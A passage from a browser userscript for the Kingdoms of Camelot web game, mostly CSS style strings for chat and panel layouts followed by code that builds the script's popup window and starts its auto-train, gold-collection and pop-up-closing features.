Options.pdxBackgroundStyle=="pdxBackground49" ||  Options.pdxBackgroundStyle=="pdxBackground50" || Options.pdxBackgroundStyle=="pdxBackground51" ||  Options.pdxBackgroundStyle=="pdxBackground52" ||  Options.pdxBackgroundStyle=="pdxBackground53" ||  Options.pdxBackgroundStyle=="pdxBackground54" ||  Options.pdxBackgroundStyle=="pdxBackground55" || Options.pdxBackgroundStyle=="pdxBackground56" ||  Options.pdxBackgroundStyle=="pdxBackground57" ||  Options.pdxBackgroundStyle=="pdxBackground58" ||  Options.pdxBackgroundStyle=="pdxBackground59" ||  Options.pdxBackgroundStyle=="pdxBackground60" || Options.pdxBackgroundStyle=="pdxBackground61" || Options.pdxBackgroundStyle=="pdxBackground62" || Options.pdxBackgroundStyle=="pdxBackground63" ||  Options.pdxBackgroundStyle=="pdxBackground64") {
var styles = '';
	var friendListTop = '915px';
	var friendListBackground = 'background: none;';
	var pdxStyleSelTop = '-1285px';
	var pdxInfoBoxTop = '-70px';
	var pdxlinkColor = '#FFF';
	var pdxlinkColorHover = 'color: #FF0000;';
	var pdxStyleSelBoxShadow = '#141516';
	var pdxhelpButtonRight = '25px';
	var pdxpostAction = 'left: 30px; top:-45px; padding: 10px 10px; position: relative;  width: 340px;';
	}//	.kocmain .mod_comm .comm_global .chatlist .global { background-color: #141516; -moz-border-radius:2px;}\
	
// FOR ALL STYLE IF CHAT ON THE RIGHT
if (Options.pbChatOnRight) { // Background Color is Dark -moz-border-radius:2px; border: 1px solid #FFF; -moz-box-shadow: 0 0 1px 2px #FFF;
	var styles = '\
	.kocmain .mod_comm .comm_global .chatlist .chatwrap .content .message { color: '+Colors.ChatFontColor+'; width: '+ (Options.chatWidth-90) +'px;}\
	.kocmain .mod_cityinfo #cityinfo_3 .unitcontainer, .kocmain .mod_cityinfo #cityinfo_4 .unitcontainer { -moz-border-radius:2px; border: 1px solid #FFF; color: #FFFFFF;  -moz-box-shadow: 0 0 1px 2px #FFF; -moz-border-radius:2px; border: 1px solid #FFF; color: #FFFFFF;  -moz-box-shadow: 0 0 1px 2px #FFF; margin-left: 5px;}\
	.kocmain .mod_cityinfo #cityinfo_3 .unitcontainer td, .kocmain .mod_cityinfo #cityinfo_4 .unitcontainer td { -moz-border-radius:2px; border: 1px solid #FFF; color: #FFFFFF;  -moz-box-shadow: 0 0 1px 2px #FFF;  -moz-border-radius:2px; border: 1px solid #FFF; color: #FFFFFF;  -moz-box-shadow: 0 0 1px 2px #FFF; padding: 3px 0;  width: 93px;  background-color: transparent; }\
	.kocmain .mod_cityinfo #cityinfo_2 table tbody td { background-color:transparent; font-weight: bold; padding: 5px 0; background: transparent;}\
	.kocmain .mod_cityinfo #cityinfo_2 table tbody tr td { padding: 5px 0; background: transparent;}\
	.kocmain .mod_cityinfo #cityinfo_1 table tbody td { background-color: none; border-bottom: 1px solid #E5DDC9;}\
	.kocmain .mod_cityinfo #cityinfo_1 table tbody tr td { background-color: transparent; border-bottom: 1px solid #E5DDC9;}\
	.kocmain .mod_cityinfo #cityinfo_1 table .grw {  padding-right: 5px; text-align: right; width: 60px;  background: none;}\
	.kocmain .mod_cityinfo #cityinfo_2 {height: 295px; overflow: auto; width:  210px; }\
	.kocmain .mod_cityinfo #cityinfo_1 .upsell {-moz-border-radius:2px; border: 1px solid #FFF; -moz-box-shadow: 0 0 1px 2px #141516; background-color: transparent; display: block; margin-left: 5px; padding: 5px 0; width: 190px;  color: #FFF !important;}\
	.kocmain .mod_cityinfo #cityinfo_1.cityinfo_body table { border:10px; }\
	#tournament_tab .datefoot { color: #FFF; font-size: 10px;  margin: 10px 0; }\
	.directory_body #tournament_tab .leaderrow {-moz-border-radius:2px; border: 1px solid #FFF; color: #FFFFFF;  -moz-box-shadow: 0 0 1px 2px #FFF;}\
	#tournament_tab .leaderboardheader { color: #FFF; font-size: 14px; font-weight: bold;  padding-bottom: 10px; text-align: center;}\
	.kocmain .mod_directory {    height: 390px;    left: 1px;    position: absolute;    top: 0px;    width: 200px;    z-index: 1;}\
	.kocmain .mod_cityinfo {  color: #FFF;  left: 530px; height:450px; overflow: hidden; position: absolute; top: -3px; width: 235px;}\
	.kocmain .kocmain_bottom { background: none; height: 390px; left: 0; position: absolute; top: 464px; width: 760px; z-index: 1 !important;}\
	.mod_comm_forum  a { font-variant:small-caps;}\
	.mod_comm_forum a:hover { font-weight: bold; font-variant:small-caps; color:'+Colors.modCommForumAhover+'; text-decoration:none; text-shadow: 1px 1px 6px '+Colors.modCommForumAhover+';}\
	.kocmain .mod_comm .comm_global .chatlist .noalliance { color:#141516;   margin-top: 5px; -moz-box-shadow: 0 0 1px 1px #CCC;  -moz-border-radius:2px;}\
	.kocmain .mod_comm .comm_global .chatlist .chatwrap .content { -moz-box-shadow: 0 0 1px 1px #FFF; padding:1.5px; -moz-border-radius:2px; border:1px inset #FF0000; color:'+Colors.ChatFontColor+'; float: left; position: relative; width: '+ (Options.chatWidth-60) +'px; }\
	.kocmain .mod_comm .comm_global .chatlist .chatwrap .content:hover { -moz-box-shadow: 0 0 2px 3px #CCC; padding:1.5px; -moz-border-radius:2px; border:1px inset #FF0000; color:#FF0000; float: left; position: relative; width: '+ (Options.chatWidth-60) +'px; }\
	.kocmain .mod_comm .seltab1 a.tab1, .kocmain .mod_comm .seltab2 a.tab2 {color: red; background-image:url('+Options.OwnBackGroundAlliance+'); cursor: pointer; display: block; float: left; height: 30px; text-decoration: none; -webkit-border-top-left-radius: 8px;-webkit-border-top-right-radius: 8px;-moz-border-radius-topleft: 8px;-moz-border-radius-topright: 8px;border-top-left-radius: 8px;border-top-right-radius: 8px; -moz-box-shadow: 0 0 3px 3px #FFFFFF;}\
	.kocmain .mod_comm .seltab1 a.tab1 span, .kocmain .mod_comm .seltab2 a.tab2 span { background-image:url('+Options.OwnBackGroundAlliance+'); cursor: pointer; color: #FF0000; display: block; font-size: 12px; font-weight: bold; height: 30px; line-height: 35px; -webkit-border-top-left-radius: 8px;-webkit-border-top-right-radius: 8px;-moz-border-radius-topleft: 8px;-moz-border-radius-topright: 8px;border-top-left-radius: 8px;border-top-right-radius: 8px; }\
	.kocmain .mod_comm .comm_global .postaction .button20 {border: 1px inset '+Colors.MainTitle+'; display: block; line-height: 30px; -moz-border-radius:6px; border:0px solid #141516; -moz-box-shadow: 0 0 2px 3px #FFF;}\
	.kocmain .mod_comm .comm_global .postaction #mod_comm_input {padding:10px;  -moz-border-radius:3px; border:0px inset #141516; -moz-box-shadow: 0 0 1px 3px #FFF; } \
	.kocmain .mod_comm .comm_global .postaction #mod_comm_input:hover { border:0px inset #141516; -moz-box-shadow: 0 0 1px 1px #FFF; } \
	.kocmain .mod_comm .comm_tabs a { transition-duration: 0.1s; -moz-transition-duration: 0.1s; -webkit-transition-duration: 0.1s; -o-transition-duration: 0.1s; }\
	';
	var pdxhelpButtonRight = '25px';
	var merlinsBoxLeft = '-554px';
	var merlinsBoxTop = '555px';
	var pdxpostAction = 'left: 30px; top:-45px; padding: 10px 10px; position: relative;  width: 340px;';
	var pdxModCommTop = 'top: 10px;';
	var modComTabsTop = ' top:-40px;';
	var pdxChatTabsFColor = 'color: #FFF;';
	var pdxModComForumLinkColor = '#FFF';
	var pdxChatContentColor = '#FFF';
	var pdxChatContentWidth = 'width: '+ (Options.chatWidth-90) +'px';
	var chatTimeOverAvatar = 'background: none repeat scroll 0 0 #600000;    border: 2px inset #600000;    border-radius: 3px 3px 3px 3px;   font-variant: small-caps;    left: -38px;    line-height: 7px;    padding: 1px;    position: absolute;    text-align: center;    top: -3px;    width: 30px;';
		var avatarTop = 'margin-top:15px;';

}
// OLD KOC STYLE
if (Options.pbChatOnRight==false) {
	var styles = '\
	.kocmain .mod_comm .comm_body #mod_comm_list1.chatlist { color:'+Colors.GlobChatFont+'; -moz-border-radius: 3px;  color:#FFFFFF; height: 305px !important; overflow:auto; }\
	.kocmain .mod_comm .comm_body #mod_comm_list2.chatlist { color:'+Colors.AllyChatFont+'; -moz-border-radius: 3px;  color:#FFFFFF; height: 305px !important; overflow:auto; }\
	.kocmain .mod_comm .comm_global .postaction #mod_comm_input {width: 265px; margin-top: 3px;}\
	.kocmain .mod_comm .comm_global .chatlist .chatwrap .content .info a {color:#FFF !important}\
			.kocmain .mod_comm .comm_global .chatlist .chatwrap .content .tx { width:230px }\
	.kocmain .mod_comm .comm_global .chatlist .chatwrap .content {  width: 240px; }\
	.kocmain .mod_comm .comm_global .chatlist .chatwrap .content .info {  width: 240px; color:'+Colors.ChatFontColor+';  }\
	.kocmain .mod_comm .comm_global .chatlist .chatwrap .content .message { width: 240px; color:'+Colors.ChatFontColor+'; }\
	.kocmain .mod_comm .comm_body #mod_comm_list1.chatlist a { color:#141516 !important}\
	.kocmain .mod_comm .seltab1 a.tab2, .kocmain .mod_comm .seltab2 a.tab1 { font-variant:small-caps;  color: #FFF; }\
	.kocmain .mod_comm .comm_body #mod_comm_list2.chatlist a { color:'+Colors.ChatLinkColAlly+'}';
	var modChatlistBoarder = '3px 3px 3px 3px';
	var pdxStyleSelBoxShadow = '#141516';
	var pdxlinkColor = '#141516';
	var pdxlinkColorHover = 'color: #FF0000;';
	var pdxStyleSelTop = '-355px';
	var pdxInfoBoxTop = '-1000px';
	var pdxChatTabsFColor = 'color: #FFF;';
	var pdxChatContentColor = '#FFF';
	var pdxChatContentWidth = 'width: 240px;';
}
// + CHAT RIGHT
if (Options.pdxBackgroundStyle=="pdxKoCOld" && Options.pbChatOnRight) { // Background Color is Dark
	var styles = '.kocmain .mod_comm .seltab1 a.tab2, .kocmain .mod_comm .seltab2 a.tab1 { font-variant:small-caps;  color: #141516; }\
	.kocmain .mod_comm .comm_global .chatlist .chatwrap .content .message { color: '+Colors.ChatFontColor+'; width: '+ (Options.chatWidth-90) +'px;}\
	.kocmain .mod_comm .seltab1 a.tab1, .kocmain .mod_comm .seltab2 a.tab2 { background-image:url('+Options.OwnBackGroundAlliance+'); height: 30px; text-decoration: none; -webkit-border-top-left-radius: 8px;-webkit-border-top-right-radius: 8px;-moz-border-radius-topleft: 8px;-moz-border-radius-topright: 8px;border-top-left-radius: 8px;border-top-right-radius: 8px; -moz-box-shadow: 0 0 3px 3px #141516;}\
	.kocmain .mod_comm .seltab1 a.tab1 span, .kocmain .mod_comm .seltab2 a.tab2 span { background-image:url('+Options.OwnBackGroundAlliance+'); -webkit-border-top-left-radius: 8px;-webkit-border-top-right-radius: 8px;-moz-border-radius-topleft: 8px;-moz-border-radius-topright: 8px;border-top-left-radius: 8px;border-top-right-radius: 8px; }\
	.kocmain .mod_comm .seltab1 a.tab1 span, .kocmain .mod_comm .seltab2 a.tab2 span {color: red;  }';
	var pdxStyleSelTop = '-1285px';
	var pdxStyleSelBoxShadow = '#141516';
	var merlinsBoxLeft = '-554px';
    var merlinsBoxTop = '555px';
	var pdxInfoBoxTop = '-70px';
	var pdxlinkColor = '#141516';
	var pdxlinkColorHover = 'color: #222222;';
	var pdxhelpButtonRight = '25px';
	var pdxModCommTop = 'top: 10px;';
	var modComTabsTop = ' top:-40px;';
	var modcommListsWidth = 'width: 360px;';
	var pdxChatTabsFColor = 'color: #141516;';
	var pdxModComForumLinkColor = '#141516';
	var pdxChatContentColor = '#141516';
	var modChatlistBoarder = '3px 3px 3px 3px';
	var modChatlistBoxShadow ='';
	var pdxChatContentWidth = 'width: '+ (Options.chatWidth-80) +'px';
	var chatTimeOverAvatar = 'background: none repeat scroll 0 0 #600000;    border: 2px inset #600000;    border-radius: 3px 3px 3px 3px;   font-variant: small-caps;    left: -38px;    line-height: 7px;    padding: 1px;    position: absolute;    text-align: center;    top: -3px;    width: 30px;';
	var avatarTop = 'margin-top:15px;';
	
	}

	// MAIN KOC POWER - STYLE
var kocPowerMainStyle = '\
	'+showMightKoCBugFix+'\
	'+showResKoCBugFix+'\
	.kocmain .mod_comm .comm_global .chatlist .chatwrap .content .tx { '+pdxChatContentWidth+'; }\
		.kocmain .mod_comm .comm_global .chatlist .direct { -moz-border-radius:3px; background-color: '+Colors.WhisperBG+'; -moz-box-shadow: 0 0 3px 2px #FF0000; padding:8px;  margin-Bottom:3px;}\
	.kocmain .mod_comm .comm_body #mod_comm_list1.chatlist div.chatwrap div.content div.message div.tx a { color:'+Colors.ChatLinkColGlobal+' }\
	.kocmain .mod_comm .comm_body #mod_comm_list2.chatlist div.chatwrap div.content div.message div.tx a{ color:'+Colors.ChatLinkColAlly+' }\
	.kocmain .mod_comm .comm_body #mod_comm_list1.chatlist div.chatwrap div.content {  '+pdxChatContentWidth+'; border-radius:3px 3px 3px 3px; padding:1px;  }\
	.kocmain .mod_comm .comm_body #mod_comm_list2.chatlist div.chatwrap div.content {  '+pdxChatContentWidth+'; border-radius:3px 3px 3px 3px; padding:1px;  }\
		.kocmain .mod_comm .comm_global .chatlist .chatwrap .content .info .time { transition-duration: 0.1s; -moz-transition-duration: 0.1s; -webkit-transition-duration: 0.1s; -o-transition-duration: 0.1s; color: '+Colors.ChatTimeCol+'; '+chatTimeOverAvatar+' }\
		.kocmain .mod_comm .comm_global .chatlist .chatwrap .content .info .time:hover { color:'+Colors.ChatTimeHover+'; }\
	#mod_comm_list2.chatlist div.chatwrap div.content div.info b { color: '+Colors.SayToAlliCol+' !important;}\
	#mod_comm_list1.chatlist div.chatwrap div.content div.info b { color: '+Colors.SayToGlobalCol+' !important;}\
	.info .nm { color: '+Colors.ChatLordName+'; font-variant:small-caps;  }\
	#mainbody div#main_engagement_tabs.topNav {width:750px;}\
		#mod_comm_list1 { overflow:auto;  border-radius:'+modChatlistBoarder+'; '+modChatlistBoxShadow+' '+modcommListsWidth+'} \
	#mod_comm_list2 {overflow:auto;  border-radius:'+modChatlistBoarder+'; '+modChatlistBoxShadow+' '+modcommListsWidth+' } \
		.kocmain .mod_comm .comm_global .chatlist .chatwrap .content .info {color:'+pdxChatContentColor+';   '+pdxChatContentWidth+'; }\
		.kocmain .mod_comm .seltab1 a.tab2, .kocmain .mod_comm .seltab2 a.tab1 { font-variant:small-caps;  '+pdxChatTabsFColor+' }\
		.mod_comm_forum  a { font-variant:small-caps;  color:'+pdxModComForumLinkColor+';}\
	.mod_comm_forum a:hover { font-weight: bold; font-variant:small-caps; text-decoration:none; text-shadow: 1px 1px 6px '+Colors.modCommForumAhover+';}\
	.kocmain .mod_comm .comm_global .chatlist .global {    background-color: transparent;}\
		.kocmain .mod_comm .comm_global .chatlist .chatwrap {  border-radius: 3px 3px 3px 3px;    box-shadow: 0 0 3px 1px #FFFFFF;    display: block;    padding: 5px;    position: relative;    margin-top: 7px;} }\
	#mainbody div#kocmain.kocmain div#kocmain_bottom.kocmain_bottom div.mod_comm div#comm_tabs.comm_tabs a:hover {text-decoration: none; text-shadow: 1px 1px 4px #FF0000;}\
	.kocmain .mod_comm .comm_body { '+pdxModCommTop+' }\
	.kocmain .mod_comm .comm_tabs { '+modComTabsTop+' }\
	.kocHeader .timeAndDomain a.helpButton {  margin-right: '+pdxhelpButtonRight+';}\
	.kocmain .panel_friendlist { '+friendListBackground+' left: 0; position: absolute; top: '+friendListTop+'; width: 760px;}\
	.pdxQuickInfoData { color:'+Colors.pdxQuickInfoData+'; font-weight: bold; }\
	.pdxVersions { padding: 2px 5px; -moz-border-radius: 3px; -moz-box-shadow: 0 0 2px 1px #FFF; }\
	.ptChatIcon {border: 2px inset red; -moz-border-radius:3px; -moz-box-shadow: 0 0 1px 1px #FFF; '+avatarTop+'}\
	.kocmain .mod_comm .mod_comm_mmb { left:'+merlinsBoxLeft+'; margin-top:'+merlinsBoxTop+';}\
	.pdxInfoBox {background-image:url('+Options.devBG+'); font-variant:small-caps; padding: 2px 3px; border-radius: 3px 3px 40px 3px;  -moz-box-shadow: 0 0 2px 2px '+pdxStyleSelBoxShadow+'; color: #FFFFFF;  height: 260px;  margin-left: 765px;  margin-top: '+pdxInfoBoxTop+';  width: 335px; }\
	.pdxInfoBox a {color:#FFF; top:-2px; transition-duration: 0.2s; -moz-transition-duration: 0.2s; -webkit-transition-duration: 0.2s; -o-transition-duration: 0.2s;}\
	.pdxInfoBox a:hover { color: #FF0000; margin-left: 2px;  box-shadow: 1px 1px 2px 0px #FF0000; padding: 0px 3px 0px 3px; }\
	.pdxStyleSel {  font-variant:small-caps; padding: 2px 3px; border-radius: 3px 3px 3px 3px;  -moz-box-shadow: 0 0 2px 2px '+pdxStyleSelBoxShadow+'; color: #FFFFFF;  margin-left: 765px;  margin-top: '+pdxStyleSelTop+'; position: absolute; width: 360px; background-image:url('+Options.devBG+'); } \
	.pdxDisableMenu {margin-left:100px;}\
	.pdxErrorPopup { color:white; font-weight:bold;   width: 200px;  margin-left: 650px; margin-top: 4px;background:#141516; -moz-border-radius: 3px; border: 0.5px solid #FF0000; -moz-box-shadow: 0 0 3px 2px #FF0000}\
	.showBadged { color:white; font-weight:bold;   width: 200px;  margin-left: 650px; margin-top: 4px;background:#141516; -moz-border-radius: 3px; border: 0.5px solid #FF0000; -moz-box-shadow: 0 0 3px 2px #FF0000}\
	span#pbMailBody_top {  color:white; font-weight:bold}\
	span#pbMailBody_top div  {     width: 200px;  margin-left: 650px; margin-top: 4px;background:#141516; -moz-border-radius: 3px; border: 0.5px solid #CCC; -moz-box-shadow: 0 0 3px 2px #CCC}\
	span#pbShowTrans_top {  color:white; font-weight:bold}\
	span#pbShowTrans_top div  {     width: 200px;  margin-left: 650px; margin-top: 4px;background:#141516; -moz-border-radius: 3px; border: 0.5px solid #0A690C; -moz-box-shadow: 0 0 3px 2px #0A690C}\
	span#pbShowRein_top {  color:white; font-weight:bold}\
	span#pbShowRein_top div  {     width: 200px;  margin-left: 650px; margin-top: 4px;background:#141516; -moz-border-radius: 3px; border: 0.5px solid #0A690C; -moz-box-shadow: 0 0 3px 2px #0A690C}\
	span#pbShowOther_top {  color:white; font-weight:bold}\
	span#pbShowOther_top div  {     width: 200px;  margin-left: 650px; margin-top: 4px;background:#141516; -moz-border-radius: 3px; border: 0.5px solid #FF0000; -moz-box-shadow: 0 0 3px 2px #FF0000}\
	.pb_top {width:100px;}\
	.enablePDXMenu {width:100px; height:0px;} .enableTrainingQue {width:100px; height:0px;}\
	.kocmain {height: 860px; }\
	'+hideKoCButtons+'\
	'+hideKoCHeader+'\
	'+hideKoCBottomStuff+'\
	'+showHideFriendList+'\
	.kofc_iframe_1 { display: none !important; }\
	.pdxInfoSpamStyle { color:#141516; background-color: '+Colors.SpamBackground+'; -moz-box-shadow: 0 0 3px 2px '+Colors.SpamBackground+'; padding:8px; margin-Bottom:3px; -moz-border-radius:3px; }\
	.pdxStatBoarder { border: 0.5px inset '+Colors.MainTitle+';}\
	.tourny_list_table { padding: 10px; -moz-border-radius:5px; border:3px solid #000000; }\
	.kocFooter { display:none }\
	.'+culang.ally+' td{background:royalblue; }\
	.'+culang.hostile+' td { background:#FF4040; }\
	.'+culang.friendly+' td{background:lightgreen; }\
	.'+culang.neutral+' td { background:#C8C8C8; }\
	.'+culang.noally+' td { background:gold; }\
	.xtabBR {padding-right: 5px; border:none; background:none;}\
	div.ptDiv {background-color:'+Colors.OverviewDarkRow+';}\
	.xtab {padding-right: 5px; border:none; background:none; white-space:nowrap; }\
	table.pdxTab tr td {border:none; background:none; white-space:nowrap;}\
	table.pdxTabOverview tr td {border-left:1px solid #ccc; white-space:nowrap; padding: 1px; background-color:'+Colors.OverviewDarkRow+';}\
	.pdxTrainTrpRes {  padding:5pdx; -moz-box-shadow:inset 0px 0px 5px #000; }\
	.pdxStat {border: 0.5px solid '+Colors.MainTitleSch+'; -moz-box-shadow: inset 0px 0px 3px '+Colors.MainTitleSch+'; font-weight:bold; padding-top:2px; padding-bottom:2px; text-align:center; color:'+Colors.MainTitleSch+';	background-color:'+Colors.MainTitle+'}\
	.pbDetLeft {padding:0 5px 0 0 !important; font-weight:bold; text-align:right}\
	.ptOddrow {background-color:'+Colors.DarkRow+'}\
	.pdxStatLight {color:'+Colors.StatsU+'}\
	.pdxEntry {padding: 7px; border:1px solid #000000; background-color:#ffeecc; white-space:nowrap;}\
	.ptErrText {font-weight:bold; color:#600000}\
	.castleBut {outline:0px; margin-left:0px; margin-right:0px; width:24px; height:26px; font-size:12px; font-weight:bold;}\
	.castleBut:hover {border-size:3px; border-color:#000;}\
	button::-moz-focus-inner, input[type="submit"]::-moz-focus-inner { border: none; }\
	.ptChatLowFood {min-height: 75px; background-color: '+ Colors.lowFoodBG +';}	.ptChatUser1Sou {background-color: '+ Colors.userBGUsrSou1 +';}\
	.ptChatUser1 {background-color: '+ Colors.userBG1 +';}		.ptChatUser2 {background-color: '+ Colors.userBG2 +';}	.ptChatUser3 {background-color: '+ Colors.userBG3 +';}	.ptChatUser4 {background-color: '+ Colors.userBG4 +';}	.ptChatUser5 {background-color: '+ Colors.userBG5 +';}	.ptChatUser6 {background-color: '+ Colors.userBG6 +';}	.ptChatUser7 {background-color: '+ Colors.userBG7 +';}	.ptChatUser8 {background-color: '+ Colors.userBG8 +';}	.ptChatUser9 {background-color: '+ Colors.userBG9 +';}	.ptChatUser10 {background-color: '+ Colors.userBG10 +';}	.ptChatUser11 {background-color: '+ Colors.userBG11 +';}		.ptChatUser12 {background-color: '+ Colors.userBG12 +';}	.ptChatUser13 {background-color: '+ Colors.userBG13 +';}	.ptChatUser14 {background-color: '+ Colors.userBG14 +';}	.ptChatUser15 {background-color: '+ Colors.userBG15 +';}	.ptChatUser16 {background-color: '+ Colors.userBG16 +';}	.ptChatUser17 {background-color: '+ Colors.userBG17 +';}	.ptChatUser18 {background-color: '+ Colors.userBG18 +';}	.ptChatUser19 {background-color: '+ Colors.userBG19 +';}	.ptChatUser10 {background-color: '+ Colors.userBG20 +';}	.ptChatUser21 {background-color: '+ Colors.userBG21 +';}		.ptChatUser22 {background-color: '+ Colors.userBG22 +';}	.ptChatUser23 {background-color: '+ Colors.userBG23 +';}	.ptChatUser24 {background-color: '+ Colors.userBG24 +';}	.ptChatUser25 {background-color: '+ Colors.userBG25 +';}	.ptChatUser26 {background-color: '+ Colors.userBG26 +';}	.ptChatUser27 {background-color: '+ Colors.userBG27 +';}	.ptChatUser28 {background-color: '+ Colors.userBG28 +';}	.ptChatUser29 {background-color: '+ Colors.userBG29 +';}	.ptChatUser10 {background-color: '+ Colors.userBG30 +';}\
	.ptWildAttack { min-height: 75px; font-weight:bold; background-color:'+Colors.WildAttack+'; }\
	.ptChatAttack { min-height: 75px; font-weight:bold; background-color:'+Colors.ChatAngriff+'; }\
	.ptChatWhisper {font-weight:bold; color:red;}\
	.ptChatAlliance {background-color:#77DDFF;color:#000}\
	.ptChatAllianz {font-weight:bold;background-color:#77DDFF;color:#000}\
	.ptChatScripter {}\
	.ptChatOfficers {color:#000; background-color:'+Colors.ChatLeader+';}\
	span.whiteOnRed {padding-left:3px; padding-right:3px; background-color:#700; color:white; font-weight:bold}\
	span.boldRed {color:#800; font-weight:bold}\
	span.boldGreen {color:green; font-weight:bold}\
	span.pdxCapShadowRR {color:#0000; font-weight:bold;text-shadow: 1px 1px 1px #FF0000; font-variant:small-caps;}\
	span.pdxCapShadowRW {color:#0000; font-weight:bold;text-shadow: 1px 1px 1px #FFFFFF; font-variant:small-caps;}\
	span.pdxCapShadowSG {color:#0000; font-weight:bold;text-shadow: 1px 1px 1px #00BB33; font-variant:small-caps;}\
	span.pdxCapShadow {color:#0000; font-weight:bold;text-shadow: 1px 1px 1px #AAA; font-variant:small-caps; text-align:center}\
	span.pdxCapShadowRed {color:#600000; font-weight:bold;text-shadow: 1px 1px 1px #AAA; font-variant:small-caps; text-align:center}\
	span.pdxCapShadowI {color:#0000; font-style:italic;text-shadow: 1px 1px 1px #AAA; font-variant:small-caps; text-align:center}\
	.castleButNon {background-image:url("'+ URL_CASTLE_BUT +'")}\
	.castleButSel {background-image:url("'+ URL_CASTLE_BUT_SEL +'")}\
	input.pbDefButOn {cursor:pointer; border:1px solid black; background-color:red;}\
	input.pbDefButOff {cursor:pointer; border:1px solid black; background-color:#0a0;}\
	a.ptButton20 {color:#ffff80}\
	hr.ptThin {padding:0px; margin:0px}\
	input.pdxSubtab {font-variant:small-caps; -moz-box-shadow:inset 0px 0px 3px #600000; -moz-border-radius:3px; cursor:pointer;border:outset 1px #ccc;background:#999;color:#666;padding: 1px 2px;background:url(http://koc-power-pdx.googlecode.com/svn/trunk/img/formbg.gif) repeat-x left top;}\
	input.pdxSubtabSel {font-variant:small-caps; color:#141516; font-weight:bold; font-size:17px; cursor:none !important}\
	input.pbSubtab { -moz-box-shadow:inset 0px 0px 3px #600000; -moz-border-radius:3px; font-variant:small-caps; cursor:pointer; width:12em; font-weight:bold; margin-right:15px;}\
	input.pbSubtabSel {  -moz-box-shadow:inset 0px 0px 3px #600000; -moz-border-radius:3px; font-variant:small-caps; background-color:#444; color:white; font-weight:bold; font-size:17px; cursor:none !important}\
    .body#mainbody div#pb_outer.CPopup table tbody tr#pb_bar.pbPopTop td span#pb_top table.pbMainTab tbody { background:none }\
	table.pbMainTab { background: #600000; border: 0.5px solid #FFF; -moz-box-shadow: 0 0 3px 2px #FFF; -moz-border-radius:3px; empty-cells: show;  margin-left: -4px;  margin-top: -3px; padding: 1px; }\
	table.pbMainTab tr td a {font-variant:small-caps; color: #FFF; text-decoration: none; }\
	table.pbMainTab tr td a:hover {-webkit-transition:all 180ms ease-in;-o-transition:all 180ms ease-in;-moz-transition:all 180ms ease-in;  color:#FF0000}\
	table.pbMainTab tr td   {margin-left:6px; empty-cells:show; padding: 0px 5px 0px 5px;   }\
	table.pbMainTab tr td.spacer {border: 1px; padding: 0px 1px;}\
	table.pbMainTab tr td.notSel {  border:1px solid #FFF; -moz-border-radius:3px; background:#141516;  width:110px; height:15px;-moz-box-shadow:inset 0px 0px 3px #FFF; }\
	table.pbMainTab tr td.sel { border:1px solid #FFF; -moz-border-radius:3px; background:#141516; height:15px; -moz-box-shadow:inset 0px 0px 3px #FF0000; }\
	table.pbMainTab tr td.sel a {color:#FF0000; }\
	table.pdxTabPadNW tr td {border:none; background:none; white-space:nowrap; padding: 2px 4px 2px 8px;}\
	table.pdxTabBR tr td {border:none; background:none;}\
	table.pdxTabLined tr td {border:1px none none solid none; padding: 2px 5px; white-space:nowrap; -moz-box-shadow: inset 0px 0px '+Colors.OptShadow+'px '+Colors.OptShadowCol+';}\
	table.pdxOptions tr td {border:1px none none solid none; white-space:nowrap; padding: 1px 3px;  -moz-box-shadow: inset 0px 0px '+Colors.OptShadow+'px '+Colors.OptShadowCol+'; -moz-border-radius:2px;}\
	table.pbSrchResults tr td {border:1px none none solid none; padding: 1px 3px; white-space:nowrap;}\
	table.pdxTabSome tr td {border:none; background:none; padding: 1px 3px; white-space:nowrap;}\
	table.pdxTabPad tr td.pdxEntry {background-color:#ffeecc; padding-left: 8px;}\
	table.ptNoPad tr td {border:none; background:none; white-space:nowrap; padding:0px}\
	tr.pbMainPopTop td { background-color:'+Colors.TabHinMain+'; border:none; height: 42px; color:#000000; text-shadow: 3px 3px 3px #FFFFFF;}\
	tr.pbretry_pbMainPopTop td { background-color:#a00; color:#fff; border:none; height: 42px;  padding:0px; }\
	tr.pbPopTop td { width:116px; float:left; margin-left:-139px; height:10px;}\
	tr.pbretry_pbPopTop td {   color:#fff; border:none; height: 21px;  padding:0px; }\
	.CPopup .CPopMain  { -moz-box-shadow:inset 0px 0px 30px #600000; -moz-border-radius:3px; border:1px solid #141516;}\
	.Cpopup { -moz-box-shadow:inset 0px 0px 30px #600000; -moz-border-radius:3px; border:1px solid #141516;}\
	.pb_CPopup { opacity:'+Colors.TabTrans+'; -moz-box-shadow:inset 0px 0px 30px #600000; -moz-border-radius:3px; border:1px solid #141516;}\
	div.indent25 {padding-left:25px}';
		// .info nm a {  font-family:verdana, sans-serif; color:'+pdxlinkColor+';}\
	// .info nm a:hover { font-family:verdana, sans-serif;  '+pdxlinkColorHover+' text-decoration:none; text-shadow: 3px 3px 15px #FF0000;}\
	
if (TEST_WIDE){  // max cityname len = 15?
  for(i=0; i<Seed.cities.length; i++){
    Seed.cities[i][1] = Seed.cities[i][1] + 'LONGERNAMETEST';
    Seed.cities[i][1] = Seed.cities[i][1].substr(0,15);
  }
  var numToAdd = TEST_WIDE_CITIES - Seed.cities.length;
  while (numToAdd-- > 0){
    var cityId = Math.random() * 1234567;
    Seed.cities.push (Seed.cities[0]);
  }    
}
  window.name = 'PDX';
  logit (""+kocpower+" - "+culang.scriptv+": "+ Version +" - "+culang.by+" PDX "+culang.loaded+"");
	
	readAutoTrainOptions();
	readAttackOptions();
	readCrestOptions(); 
	readCombatOptions();
	setCities();
  if(!GlobalOptions.pbWideScreen && Options.pbWinPos.x > 700){
    var c = getClientCoords (document.getElementById('main_engagement_tabs'));
    Options.pbWinPos.x = c.x+4;
    saveOptions ();
  }
  if (Options.pbWinPos==null || Options.pbWinPos.x==null|| Options.pbWinPos.x=='' || isNaN(Options.pbWinPos.x)){
    var c = getClientCoords (document.getElementById('main_engagement_tabs'));
    Options.pbWinPos.x = c.x+4;
    Options.pbWinPos.y = c.y+c.height;
    saveOptions ();
  }
  mainPop = new CPopup ('pb', Options.pbWinPos.x, Options.pbWinPos.y, 650,750, Options.pbWinDrag,
      function (){
        tabManager.hideTab();
        Options.pbWinIsOpen=false;
        saveOptions()
  });
  
  mainPop.autoHeight (true);
  mainPop.getMainDiv().innerHTML = '<STYLE>'+ styles + kocPowerMainStyle +'</style>';
  
	AddMainTabLink('POWER', eventHideShow, mouseMainTab);
	tabManager.init (mainPop.getMainDiv());
	FairieKiller.init (Options.pbKillFairie);
	RefreshEvery.init ();
	CollectGold.init();
  stats();
	if (Options.pdxTimeZones=="estTimeZone") estClock.init ();
